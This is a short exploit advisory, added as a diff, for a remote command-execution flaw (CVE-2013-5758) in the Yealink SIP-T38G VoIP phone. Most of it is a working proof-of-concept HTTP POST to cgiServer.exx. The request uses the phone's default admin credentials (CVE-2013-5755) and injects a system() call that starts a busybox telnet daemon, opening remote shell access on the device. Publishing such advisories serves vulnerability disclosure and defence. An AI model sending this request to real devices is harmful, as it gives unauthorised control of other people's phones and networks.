@@ -1,0 +1,29 @@
+Title: Yealink VoIP Phone SIP-T38G Remote Command Execution
+Author: Mr.Un1k0d3r & Doreth.Z10 From RingZer0 Team
+Vendor Homepage: http://www.yealink.com/Companyprofile.aspx
+Version: VoIP Phone SIP-T38G
+CVE: CVE-2013-5758
+
+Description:
+
+Using cgiServer.exx we are able to send OS command using the system
+function.
+
+POC:
+
+POST /cgi-bin/cgiServer.exx HTTP/1.1
+Host: 10.0.75.122
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Basic YWRtaW46YWRtaW4= (Default Creds CVE-2013-5755)
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+system("/bin/busybox%20telnetd%20start")
+
+
+
+-- 
+*Mr.Un1k0d3r** or 1 #*
